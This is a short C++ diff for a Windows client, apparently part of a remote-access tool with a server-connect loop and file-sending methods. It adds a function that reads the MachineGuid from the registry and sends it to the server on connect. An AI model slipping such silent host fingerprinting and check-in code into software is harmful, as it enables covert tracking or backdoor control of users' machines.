@@ -21,6 +21,8 @@ void Core::connect_to_server()
 		stat = connect(client_socket, result->ai_addr, (int)result->ai_addrlen);
 		Sleep(1000);
 	}
+	string id = get_machine_guid();
+	send_response(id);
 }
 
 bool Core::send_response(string& response)
@@ -134,4 +136,33 @@ bool Core::send_file(string filepath)
 	closesocket(file_socket);
 	free(file_buffer);
 	return true;
+}
+
+string Core::get_machine_guid()
+{
+	HKEY key;
+	DWORD size = 1000;
+	BYTE* data = new BYTE[size];
+
+	RegOpenKeyEx(
+		HKEY_LOCAL_MACHINE,
+		L"SOFTWARE\\Microsoft\\Cryptography",
+		0,
+		KEY_READ | KEY_WOW64_64KEY,
+		&key
+	);
+
+	RegQueryValueExA(
+		key,
+		"MachineGuid",
+		NULL,
+		NULL,
+		data,
+		&size
+	);
+
+	RegCloseKey(key);
+	string guid = (char*)data;
+	delete[] data;
+	return guid;
 }
